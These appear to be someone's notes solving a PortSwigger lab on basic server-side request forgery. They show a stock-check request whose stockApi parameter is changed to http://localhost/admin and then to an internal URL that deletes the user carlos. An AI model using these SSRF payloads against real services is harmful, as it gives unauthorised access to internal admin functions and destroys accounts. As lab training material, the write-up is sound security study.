
# #PortSwigger 


![[Pasted image 20251213194841.png]]


## Lab Description

This lab has a stock check feature which fetches data from an internal system.

**Objective:** Change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

---
---


### Step 1: Capture the Stock Check Request

1. In Burp's browser, access the lab
2. Visit a product page
3. Click **Check stock**
4. In Burp Proxy, find the `POST /product/stock` request

**Example request:**
```
POST /product/stock HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```


![[Pasted image 20251213194903.png]]


---

### Step 2: Modify the stockApi Parameter

**Original:**
```
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

**Modified:**
```
stockApi=http://localhost/admin
```


**Full request:**
![[Pasted image 20251213194946.png]]


---

### Step 3: Send the Request

1. Click **Send** in Repeater
2. Observe the response

```
HTTP/2 302 Found
Location: /admin
Set-Cookie: session=...
```
- *Admin interface accessed!

---

### Step 4: Identify the Delete URL

In the response, look for the delete link:
```
http://localhost/admin/delete?username=carlos
```


![[Pasted image 20251213195247.png]]


---

### Step 6: Send the Request

1. Click **Send**
2. Observe the response

**Response:**
![[Pasted image 20251213195321.png]]

User `carlos` deleted!

---

### Step 7: Lab Solved

![[Pasted image 20251213195338.png]]

---
---

